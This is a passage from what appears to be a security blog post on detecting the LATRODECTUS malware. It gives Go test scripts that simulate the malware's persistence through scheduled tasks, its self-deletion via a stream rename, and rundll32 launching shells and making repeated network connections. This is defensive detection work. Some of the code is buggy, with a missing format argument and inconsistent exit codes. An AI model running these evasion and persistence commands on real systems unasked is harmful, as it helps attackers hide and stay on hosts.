</span></span><span style="display:flex;"><span>	untrustedCmdOut, untrustedErr <span style="color:#ff79c6">:=</span> untrustedCmd.<span style="color:#50fa7b">CombinedOutput</span>()
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span> untrustedErr <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;failed to execute command: %s&#34;</span>, <span style="color:#8be9fd;font-style:italic">string</span>(untrustedCmdOut)))
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">1</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;successfully executed untrusted command&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// execution from commonly abused path
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	abusedPathCmd <span style="color:#ff79c6">:=</span> exec.<span style="color:#50fa7b">Command</span>(<span style="color:#f1fa8c">&#34;cmd.exe&#34;</span>, <span style="color:#f1fa8c">&#34;/C&#34;</span>, <span style="color:#f1fa8c">&#34;schtasks.exe /create /tn test_task_abused_path /tr calc.exe /sc daily /f&#34;</span>)
</span></span><span style="display:flex;"><span>	abusedPathCmdOut, abusedPathErr <span style="color:#ff79c6">:=</span> abusedPathCmd.<span style="color:#50fa7b">CombinedOutput</span>()
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span> abusedPathErr <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;failed to execute abused path command: %s&#34;</span>, <span style="color:#8be9fd;font-style:italic">string</span>(abusedPathCmdOut))
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">1</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;successfully executed abused path command&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// execution from mounted device
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	mountedDeviceCmd <span style="color:#ff79c6">:=</span> exec.<span style="color:#50fa7b">Command</span>(<span style="color:#f1fa8c">&#34;cmd.exe&#34;</span>, <span style="color:#f1fa8c">&#34;/C&#34;</span>, <span style="color:#f1fa8c">&#34;schtasks.exe /create /tn test_task_mounted_device /tr calc.exe /sc daily /f&#34;</span>)
</span></span><span style="display:flex;"><span>	mountedDeviceCmdOut, mountedDeviceErr <span style="color:#ff79c6">:=</span> mountedDeviceCmd.<span style="color:#50fa7b">CombinedOutput</span>()
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span> mountedDeviceErr <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;failed to execute mounted device command: %s&#34;</span>))
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">1</span>) <span style="color:#6272a4">// ERROR
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	}
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;[+] Successfully executed mounted device command&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;[+] Successfully executed all commands&#34;</span>)
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">101</span>) <span style="color:#6272a4">// UNPROTECTED
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">func</span> <span style="color:#50fa7b">cleanup</span>() {
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// Clean up any created files or artifacts
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	exec.<span style="color:#50fa7b">Command</span>(<span style="color:#f1fa8c">&#34;cmd.exe&#34;</span>, <span style="color:#f1fa8c">&#34;/C&#34;</span>, <span style="color:#f1fa8c">&#34;schtasks.exe /delete /tn test_task /f&#34;</span>).<span style="color:#50fa7b">Run</span>()
</span></span><span style="display:flex;"><span>	exec.<span style="color:#50fa7b">Command</span>(<span style="color:#f1fa8c">&#34;cmd.exe&#34;</span>, <span style="color:#f1fa8c">&#34;/C&#34;</span>, <span style="color:#f1fa8c">&#34;schtasks.exe /delete /tn test_task_untrusted /f&#34;</span>).<span style="color:#50fa7b">Run</span>()
</span></span><span style="display:flex;"><span>	exec.<span style="color:#50fa7b">Command</span>(<span style="color:#f1fa8c">&#34;cmd.exe&#34;</span>, <span style="color:#f1fa8c">&#34;/C&#34;</span>, <span style="color:#f1fa8c">&#34;schtasks.exe /delete /tn test_task_abused_path /f&#34;</span>).<span style="color:#50fa7b">Run</span>()
</span></span><span style="display:flex;"><span>	exec.<span style="color:#50fa7b">Command</span>(<span style="color:#f1fa8c">&#34;cmd.exe&#34;</span>, <span style="color:#f1fa8c">&#34;/C&#34;</span>, <span style="color:#f1fa8c">&#34;schtasks.exe /delete /tn test_task_mounted_device /f&#34;</span>).<span style="color:#50fa7b">Run</span>()
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;[+] Cleanup completed successfully&#34;</span>)
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">100</span>) <span style="color:#6272a4">// PROTECTED
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>}
</span></span></code></pre></div><p>the script detects persistence methods like task creation that isn&rsquo;t linked to a typical system management process</p>
<h3 id="potential-self-deletion-of-a-running-executable">potential self deletion of a running executable</h3>
<p>the malware can delete its own executable after execution, to evade post-infection forensic analysis.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">func</span> <span style="color:#50fa7b">test</span>() {
</span></span><span style="display:flex;"><span>	executeCommand <span style="color:#ff79c6">:=</span> <span style="color:#8be9fd;font-style:italic">func</span>(command <span style="color:#8be9fd">string</span>) {
</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">if</span> !Endpoint.<span style="color:#50fa7b">IsAvailable</span>(<span style="color:#f1fa8c">&#34;cmd.exe&#34;</span>) {
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;[+] command execution is not available&#34;</span>)
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">126</span>) <span style="color:#6272a4">// PROTECTED
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>		}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		out, err <span style="color:#ff79c6">:=</span> exec.<span style="color:#50fa7b">Command</span>(<span style="color:#f1fa8c">&#34;cmd.exe&#34;</span>, <span style="color:#f1fa8c">&#34;/C&#34;</span>, command).<span style="color:#50fa7b">CombinedOutput</span>()
</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;[-] failed to execute command: %s&#34;</span>, <span style="color:#8be9fd;font-style:italic">string</span>(out)))
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">1</span>) <span style="color:#6272a4">// ERROR
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>		}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;[+] successfully executed command: %s&#34;</span>, command))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">if</span> strings.<span style="color:#50fa7b">Contains</span>(<span style="color:#8be9fd;font-style:italic">string</span>(out), <span style="color:#f1fa8c">&#34;Access Denied&#34;</span>) {
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;[+] process execution was blocked&#34;</span>)
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">126</span>) <span style="color:#6272a4">// PROTECTED
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>		}
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// Simulate execution of a file followed by the rename of its primary file stream
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	executablePath <span style="color:#ff79c6">:=</span> <span style="color:#f1fa8c">&#34;C:\\Users\\Public\\self_delete_test.exe&#34;</span>
</span></span><span style="display:flex;"><span>	renamedPath <span style="color:#ff79c6">:=</span> <span style="color:#f1fa8c">&#34;C:\\Users\\Public\\self_delete_test.exe:delete&#34;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#50fa7b">executeCommand</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;powershell.exe -Command New-Item -Path %s -ItemType File&#34;</span>, executablePath))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// run executable
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	<span style="color:#50fa7b">executeCommand</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;start %s&#34;</span>, executablePath))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// rename primary file stream
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	<span style="color:#50fa7b">executeCommand</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;powershell.exe -Command Rename-Item -Path %s -NewName %s&#34;</span>, executablePath, renamedPath))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// check rename action
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	<span style="color:#ff79c6">if</span> _, err <span style="color:#ff79c6">:=</span> os.<span style="color:#50fa7b">Stat</span>(renamedPath); os.<span style="color:#50fa7b">IsNotExist</span>(err) {
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;[-] renamed file does not exist&#34;</span>)
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">101</span>) <span style="color:#6272a4">// UNPROTECTED
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">100</span>) <span style="color:#6272a4">// PROTECTED
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">func</span> <span style="color:#50fa7b">cleanup</span>() {
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// remove the created files
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	os.<span style="color:#50fa7b">Remove</span>(<span style="color:#f1fa8c">&#34;C:\\Users\\Public\\self_delete_test.exe&#34;</span>)
</span></span><span style="display:flex;"><span>	os.<span style="color:#50fa7b">Remove</span>(<span style="color:#f1fa8c">&#34;C:\\Users\\Public\\self_delete_test.exe:delete&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;[+] cleanup completed successfully&#34;</span>)
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">100</span>) <span style="color:#6272a4">// PROTECTED
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>}
</span></span></code></pre></div><p>the script detects attempts to remove running executables from the disk.</p>
<h3 id="long-termhigh-count-of-network-connections-by-rundll32">long-term/high-count of network connections by <code>rundll32</code></h3>
<p><code>LATRODECTUS</code> uses <code>rundll32.exe</code> to create a high number of network connections [C2 comms or data exfiltration].</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">func</span> <span style="color:#50fa7b">test</span>() {
</span></span><span style="display:flex;"><span>	executeCommand <span style="color:#ff79c6">:=</span> <span style="color:#8be9fd;font-style:italic">func</span>(command <span style="color:#8be9fd">string</span>) {
</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">if</span> !Endpoint.<span style="color:#50fa7b">IsAvailable</span>(<span style="color:#f1fa8c">&#34;cmd.exe&#34;</span>) {
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;[+] command execution is not available&#34;</span>)
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">126</span>) <span style="color:#6272a4">// PROTECTED
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>		}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		out, err <span style="color:#ff79c6">:=</span> exec.<span style="color:#50fa7b">Command</span>(<span style="color:#f1fa8c">&#34;cmd.exe&#34;</span>, <span style="color:#f1fa8c">&#34;/C&#34;</span>, command).<span style="color:#50fa7b">CombinedOutput</span>()
</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;[-] failed to execute command: %s&#34;</span>, <span style="color:#8be9fd;font-style:italic">string</span>(out)))
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">1</span>) <span style="color:#6272a4">// ERROR
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>		}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;[+] successfully executed command: %s&#34;</span>, command))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">if</span> strings.<span style="color:#50fa7b">Contains</span>(<span style="color:#8be9fd;font-style:italic">string</span>(out), <span style="color:#f1fa8c">&#34;Access Denied&#34;</span>) {
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;[+] process execution was blocked&#34;</span>)
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">126</span>) <span style="color:#6272a4">// PROTECTED: Access Denied
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>		}
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// rundll32.exe creating a PE file in the InetCache folder
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	rundll32Path <span style="color:#ff79c6">:=</span> <span style="color:#f1fa8c">&#34;C:\\Windows\\System32\\rundll32.exe&#34;</span>
</span></span><span style="display:flex;"><span>	peFilePath <span style="color:#ff79c6">:=</span> <span style="color:#f1fa8c">&#34;C:\\Users\\Public\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\malicious.exe&#34;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#50fa7b">executeCommand</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;%s /c echo 4D5A &gt; %s&#34;</span>, rundll32Path, peFilePath))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// rundll32.exe making network connections to public IP addresses
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	publicIPs <span style="color:#ff79c6">:=</span> []<span style="color:#8be9fd">string</span>{<span style="color:#f1fa8c">&#34;8.8.8.8&#34;</span>, <span style="color:#f1fa8c">&#34;8.8.4.4&#34;</span>}
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">for</span> _, ip <span style="color:#ff79c6">:=</span> <span style="color:#ff79c6">range</span> publicIPs {
</span></span><span style="display:flex;"><span>		<span style="color:#50fa7b">executeCommand</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;%s /c ping %s&#34;</span>, rundll32Path, ip))
</span></span><span style="display:flex;"><span>		time.<span style="color:#50fa7b">Sleep</span>(<span style="color:#bd93f9">100</span> <span style="color:#ff79c6">*</span> time.Millisecond)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// long-term and high count of network connections
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	startTime <span style="color:#ff79c6">:=</span> time.<span style="color:#50fa7b">Now</span>()
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">:=</span> <span style="color:#bd93f9">0</span>; i &lt; <span style="color:#bd93f9">100</span>; i<span style="color:#ff79c6">++</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">for</span> _, ip <span style="color:#ff79c6">:=</span> <span style="color:#ff79c6">range</span> publicIPs {
</span></span><span style="display:flex;"><span>			<span style="color:#50fa7b">executeCommand</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;%s /c ping %s&#34;</span>, rundll32Path, ip))
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>		time.<span style="color:#50fa7b">Sleep</span>(<span style="color:#bd93f9">10</span> <span style="color:#ff79c6">*</span> time.Millisecond)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	duration <span style="color:#ff79c6">:=</span> time.<span style="color:#50fa7b">Since</span>(startTime)
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span> duration.<span style="color:#50fa7b">Seconds</span>() &lt; <span style="color:#bd93f9">1</span> {
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;[+] Long-term and high count network connection simulation successful&#34;</span>)
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">100</span>) <span style="color:#6272a4">// PROTECTED
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	} <span style="color:#ff79c6">else</span> {
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;[-] Simulation took too long&#34;</span>)
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">1</span>) <span style="color:#6272a4">// ERROR
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	}
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>the script detects abnormal network activity associated with <code>rundll32.exe</code>, especially when the activity involves multiple connections to public IP addresses.</p>
<h3 id="command-shell-activity-started-via-rundll32">command shell activity started via <code>rundll32</code></h3>
<p><code>rundll32.exe</code> can be used to launch a command shell, that&rsquo;s then used to execute malicious commands.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">func</span> <span style="color:#50fa7b">test</span>() {
</span></span><span style="display:flex;"><span>	executeCommand <span style="color:#ff79c6">:=</span> <span style="color:#8be9fd;font-style:italic">func</span>(command <span style="color:#8be9fd">string</span>) {
</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">if</span> !Endpoint.<span style="color:#50fa7b">IsAvailable</span>(<span style="color:#f1fa8c">&#34;cmd.exe&#34;</span>) {
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;[+] command execution is not available&#34;</span>)
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">126</span>) <span style="color:#6272a4">// PROTECTED
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>		}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		out, err <span style="color:#ff79c6">:=</span> exec.<span style="color:#50fa7b">Command</span>(<span style="color:#f1fa8c">&#34;cmd.exe&#34;</span>, <span style="color:#f1fa8c">&#34;/C&#34;</span>, command).<span style="color:#50fa7b">CombinedOutput</span>()
</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;[-] failed to execute command: %s&#34;</span>, <span style="color:#8be9fd;font-style:italic">string</span>(out)))
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">1</span>) <span style="color:#6272a4">// ERROR
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>		}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;[+] successfully executed command: %s&#34;</span>, command))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">if</span> strings.<span style="color:#50fa7b">Contains</span>(<span style="color:#8be9fd;font-style:italic">string</span>(out), <span style="color:#f1fa8c">&#34;Access Denied&#34;</span>) {
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;[+] process execution was blocked&#34;</span>)
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">126</span>) <span style="color:#6272a4">// PROTECTED
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>		}
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// rundll32.exe launching a command shell (cmd.exe) with a malicious command
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	rundll32Path <span style="color:#ff79c6">:=</span> <span style="color:#f1fa8c">&#34;C:\\Windows\\System32\\rundll32.exe&#34;</span>
</span></span><span style="display:flex;"><span>	cmdPath <span style="color:#ff79c6">:=</span> <span style="color:#f1fa8c">&#34;C:\\Windows\\System32\\cmd.exe&#34;</span>
</span></span><span style="display:flex;"><span>	rundll32Cmd <span style="color:#ff79c6">:=</span> fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;%s %s&#34;</span>, rundll32Path, cmdPath)
</span></span><span style="display:flex;"><span>	<span style="color:#50fa7b">executeCommand</span>(rundll32Cmd)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// rundll32.exe launching PowerShell with a malicious command
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	powershellPath <span style="color:#ff79c6">:=</span> <span style="color:#f1fa8c">&#34;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe&#34;</span>
</span></span><span style="display:flex;"><span>	rundll32PowershellCmd <span style="color:#ff79c6">:=</span> fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;%s %s&#34;</span>, rundll32Path, powershellPath)
</span></span><span style="display:flex;"><span>	<span style="color:#50fa7b">executeCommand</span>(rundll32PowershellCmd)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">100</span>) <span style="color:#6272a4">// PROTECTED
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>}
</span></span></code></pre></div><p>the script detects suspicious usage of <code>rundll32.exe</code> to initiate command shells, which is uncommon but a potent method of executing further commands.</p>
<h2 id="conclusion">conclusion</h2>
<p>after deep-diving into the code and reverse engineering the malware, i developed a series of Go scripts to detect the key behaviors <code>LATRODECTUS</code> exhibits. the process involved decrypting strings, analyzing how the malware resolves native APIs dynamically, and understanding its payload delivery mechanisms. with these insights, i was able to create detection methods that directly address the tactics used by this malware. the goal wasnât just to stop it in its tracks but to make sure weâre catching every subtle move it makes. each script is a result of careful analysis, aimed at covering all the gaps this malware might exploit.</p>
</main>


    <br>
    <hr>
    
      Next: <a href="//localhost:1313/posts/go-pro/">goPro: detecting process hollowing with Go</a>
    




<footer>
  <div class="footer-nav">
    
    <a class="next" href="/posts/cosmos-1/" style="float: right"
      >next: cosmos, part 1: red-teaming corporate active directory forests</a
    >
     
    <a class="previous" href="/posts/go-pro/">previous</a>
    
  </div>
</footer>



<script defer>
  document.addEventListener("keydown", function (e) {
    if (document.activeElement.isContentEditable) {
      return false;
    }
    if (document.activeElement.tagName == "INPUT") {
      return false;
    }
    if (e.altKey || e.ctrlKey || e.shiftKey) {
      return false;
    }
    var key = e.key;
    if (key === "h") {
      e.preventDefault();
      e.stopPropagation();
      window.location.href = "/";
    } else if (key === "t") {
      e.preventDefault();
      e.stopPropagation();
      window.location.href = `https://${location.hostname}/tags`;
    } else if (key === "i") {
      e.preventDefault();
      e.stopPropagation();
      const inputs = document.querySelectorAll("input");
      for (let i = 0; i < inputs.length; i++) {
        if (inputs[i].offsetParent !== null) {
          inputs[i].selectionStart = inputs[i].selectionEnd =
            inputs[i].value.length;
          inputs[i].focus();
          break;
        }
      }
    }
    return false;
  });
</script>


<script defer>
  function throttle(fn, wait) {
    var time = Date.now();
    return function () {
      var now = Date.now()
      if (time + wait - now < 0) {
        fn();
        time = now;
      }
    };
  }

  function scrollHandler() {
    const anchors = Array.from(document.querySelectorAll("body h2, body h3"));

    function scrollCallback() {
      var scrollTop = window.pageYOffset || document.documentElement.scrollTop;

      
      for (var i = 0; i < anchors.length; i++) {
        var anchorId = anchors[i].getAttribute("id");
        var link = document.querySelector(
          'nav ul li a[href="#' + anchorId + '"]',
        );
        if (link) {
          link.classList.remove("active-toc");
        }
      }

      
      for (var i = anchors.length - 1; i >= 0; i--) {
        var offsetTop = anchors[i].offsetTop;
        if (scrollTop > offsetTop - 75) {
          var anchorId = anchors[i].getAttribute("id");
          var link = document.querySelector(
            'nav ul li a[href="#' + anchorId + '"]',
          );
          if (link) {
            link.classList.add("active-toc");
            break;
          }
        }
      }
    }

    window.addEventListener(
      "scroll",
      throttle(scrollCallback, 300),
    );
  }
  setTimeout(scrollHandler, 100);
</script>

<script defer>
  function addCopyButtonToCodeBlocks() {
    
    const codeBlocks = document.querySelectorAll('code[class^="language-"]');

    codeBlocks.forEach((codeBlock) => {
      const copyButton = document.createElement("button");
      copyButton.classList.add("copy-code-button");
      copyButton.innerHTML = "copy";

      
      copyButton.addEventListener("click", () => {
        
        const elements = codeBlock.querySelectorAll(".cl");
        let codeToCopy = "";
        elements.forEach((element) => {
          codeToCopy += element.innerText;
        });
        navigator.clipboard.writeText(codeToCopy);

        
        copyButton.innerHTML = "copied!";
        setTimeout(() => {
          copyButton.innerHTML = "copy";
        }, 1500);
      });

      
      codeBlock.parentNode.before(copyButton);
    });
  }
  setTimeout(function () {
    addCopyButtonToCodeBlocks();
  }, 100);
</script><!DOCTYPE html>
<html lang="en-us">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />

    <meta http-equiv="cache-control" content="max-age=0" />
    <meta http-equiv="cache-control" content="no-cache" />
    <meta http-equiv="expires" content="0" />
    <meta http-equiv="expires" content="Tue, 01 Jan 1980 1:00:00 GMT" />
    <meta http-equiv="pragma" content="no-cache" />

    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
